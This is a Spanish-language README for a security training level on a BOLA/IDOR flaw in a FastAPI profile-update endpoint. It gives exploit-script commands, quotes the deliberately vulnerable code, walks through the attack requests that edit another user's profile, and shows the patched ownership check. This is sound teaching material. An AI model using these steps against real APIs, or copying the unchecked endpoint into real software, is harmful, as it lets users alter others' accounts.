
# Level 2: Broken Object Level Authorization (BOLA) - IDOR

## 📌 Inicio Rápido

### Prerequisitos
Asegúrate de tener activado tu entorno virtual de Python:

```bash
source venv/bin/activate
```

### Comandos de Prueba

#### 1️⃣ Ejecutar exploit para ver la vulnerabilidad
```bash
python3 new_parche_proyecto/levels/lvl_2/script/exploit_level2_idor.py
```

#### 2️⃣ Aplicar parche de seguridad
```bash
sudo cp new_parche_proyecto/levels/lvl_2/fix/update_profile_service.py app/apis/auth/services/update_profile_service.py
```

#### 3️⃣ Verificar que la vulnerabilidad fue corregida
```bash
python3 new_parche_proyecto/levels/lvl_2/script/exploit_level2_idor.py    
```

#### 4️⃣ Revertir parche (opcional)
```bash
sudo cp new_parche_proyecto/levels/lvl_2/unpatch/update_profile_service.py app/apis/auth/services/update_profile_service.py
```

---

## 📋 Clasificación OWASP
**API1:2023 - Broken Object Level Authorization (BOLA)**

## 🎯 Descripción de la Vulnerabilidad

El endpoint `PUT /profile` permite a cualquier usuario autenticado actualizar el perfil de **cualquier otro usuario**, simplemente proporcionando el `username` del usuario objetivo en el cuerpo de la solicitud. El servidor no verifica si el usuario autenticado tiene autorización para modificar el perfil especificado.

### El Problema

El código vulnerable en la función `update_profile` no realiza una validación adecuada para asegurar que `current_user.username` coincida con `user.username` antes de proceder con la actualización. Esto significa que:

- ✅ Se valida que el usuario esté autenticado (`get_current_user`).
- ❌ **NO** se valida si el usuario autenticado es el propietario del perfil que intenta modificar.
- ❌ Cualquier `Customer` puede modificar los detalles de otros usuarios.

El código vulnerable es el siguiente:

```python
@router.put("/profile", response_model=UserUpdate, status_code=status.HTTP_200_OK)
def update_profile(
    user: UserUpdate,
    current_user: Annotated[User, Depends(get_current_user)],
    db: Session = Depends(get_db),
):
    db_user = get_user_by_username(db, user.username) #De Aquí la vulnerabilidad
    for var, value in user.dict().items():
        if value:
            setattr(db_user, var, value)
    db.add(db_user)
    db.commit()
    db.refresh(db_user)
    return db_user
```

## 🔓 Cómo se Explota

### Paso 1: Crear una Cuenta de Atacante (Customer)
El atacante registra una cuenta normal (por ejemplo, `David` con rol `Customer`).

```bash
POST /register
Content-Type: application/json

{
  "username": "David",
  "password": "pass123",
  "phone_number": "555-4321",
  "first_name": "Attack",
  "last_name": "User"
}
```

### Paso 2: Autenticación del Atacante
Obtener un token de acceso para el usuario `David`:

```bash
POST /token
Content-Type: application/x-www-form-urlencoded

username=David&password=pass123
```

### Paso 3: Identificar un Usuario Objetivo
El atacante necesita el `username` de un usuario objetivo (por ejemplo, `Jose`). Esto puede ser obtenido mediante enumeración o filtración de información en otros endpoints.

```bash
GET /profile
Authorization: Bearer {token_david}
```
* (Asumiendo que Jose ya existe en el sistema)

### Paso 4: Modificar el Perfil del Usuario Objetivo
El atacante usa su propio token (`token_david`) para autenticarse, pero en el cuerpo de la petición `PUT /profile`, especifica el `username` del usuario `Jose` y los nuevos datos para su perfil.

```bash
PUT /profile
Authorization: Bearer {token_david}
Content-Type: application/json

{
  "username": "Jose",
  "phone_number": "312856323",
  "first_name": "PerfilEditado",
  "last_name": "Editado2"
}
```

**Respuesta:**
```
HTTP/1.1 200 OK
```
El perfil de `Jose` ha sido modificado por `David`.

## 🛡️ Cómo Solucionarlo

### Solución: Validar Propiedad del Recurso (current_user vs user.username)

**Código Vulnerable:**
```python
@router.put("/profile", response_model=UserUpdate, status_code=status.HTTP_200_OK)
def update_profile(
    user: UserUpdate,
    current_user: Annotated[User, Depends(get_current_user)],
    db: Session = Depends(get_db),
):
    db_user = get_user_by_username(db, user.username) #De Aquí la vulnerabilidad
    for var, value in user.dict().items():
        if value:
            setattr(db_user, var, value)
    db.add(db_user)
    db.commit()
    db.refresh(db_user)
    return db_user
```

**Código Seguro:**
```python
@router.put("/profile", response_model=UserUpdate, status_code=status.HTTP_200_OK)
def update_profile(
    user: UserUpdate,
    current_user: Annotated[User, Depends(get_current_user)],
    db: Session = Depends(get_db),
):
    # Solución: Verificar que el usuario que intenta actualizar es el propietario del perfil
    if current_user.username != user.username:
        raise HTTPException(
            status_code=status.HTTP_403_FORBIDDEN,
            detail="El username ingresado no coincide con la sesión actual, revisa"
        )
    
    db_user = get_user_by_username(db, user.username)
    for var, value in user.dict().items():
        if value:
            setattr(db_user, var, value)
    db.add(db_user)
    db.commit()
    db.refresh(db_user)
    return db_user
```

### Principios de Seguridad Aplicados

1.  **Validación de Autorización**: Asegurar que el usuario autenticado tenga permiso para realizar la acción sobre el recurso específico.
2.  **Least Privilege**: Los usuarios solo pueden modificar sus propios recursos, a menos que se les otorguen explícitamente permisos administrativos.
3.  **Secure by Default**: Las funciones deben ser restrictivas por defecto.

## 🔍 Escenarios de Ataque

### Escenario 1: Suplantación de Identidad
Un atacante cambia la información de contacto de otro usuario (teléfono, nombre) para dificultar la recuperación de su cuenta o para fines de phishing.

### Escenario 2: Bloqueo de Cuenta
Un atacante modifica el perfil de un usuario importante, cambiando datos cruciales para que este no pueda acceder o operar su cuenta correctamente.

### Escenario 3: Sabotaje de Datos
Un competidor malicioso puede alterar los datos de perfil de usuarios registrados para causar desconfianza o arruinar la experiencia del cliente.

### Escenario 4: Pruebas de Penetración
Un tester descubre que puede modificar el perfil de cualquier usuario, demostrando la vulnerabilidad BOLA como una prueba de concepto.

## 🔬 Prueba de Concepto

Ejecutar el exploit:
```bash
python new_parche_proyecto/levels/lvl_2/script/exploit_lvl2.py
```

El script:
1.  Creará dos usuarios (`David` y `Jose`).
2.  Obtendrá tokens de autenticación para ambos.
3.  Consultará el perfil inicial de `Jose`.
4.  Intentará modificar el perfil de `Jose` usando el token de `David` y un `username` objetivo (`Jose`).
5.  Verificará si la modificación fue exitosa.
6.  Mostrará si la API es vulnerable o está protegida.

## 📚 Referencias

-   OWASP API Security Top 10 2023: API1:2023
-   CWE-285: Improper Authorization
-   CWE-863: Incorrect Authorization


